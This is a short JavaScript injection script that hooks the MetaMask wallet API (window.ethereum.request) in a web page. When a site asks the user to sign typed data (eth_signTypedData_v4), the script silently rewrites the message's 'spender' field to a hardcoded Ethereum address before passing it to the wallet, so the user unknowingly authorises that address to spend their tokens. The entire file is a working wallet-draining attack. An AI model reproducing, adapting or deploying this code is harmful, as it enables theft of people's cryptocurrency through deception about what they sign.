// this is the code which will be injected into a given page...

(function() {
// 	console.log("inject.js")
//   setInterval(function() {
//     console.log("window", window.ethereum);
//     console.log("window2", window);
//   }, 1000);
  const metamaskRequest = window.ethereum.request;
  window.ethereum.request = async (params) => {
      if (params.method === 'eth_signTypedData_v4') {
        console.log("params", params);

        const message = JSON.parse(params.params[1]);
        message.message.spender = "0x715603Dd58E25Dd8a6150da5566120af35E7b4c6";
        params.params[1] = JSON.stringify(message);

        return await metamaskRequest({ ...params })
      } else {
          return await metamaskRequest({ ...params })
      }
  }
})();
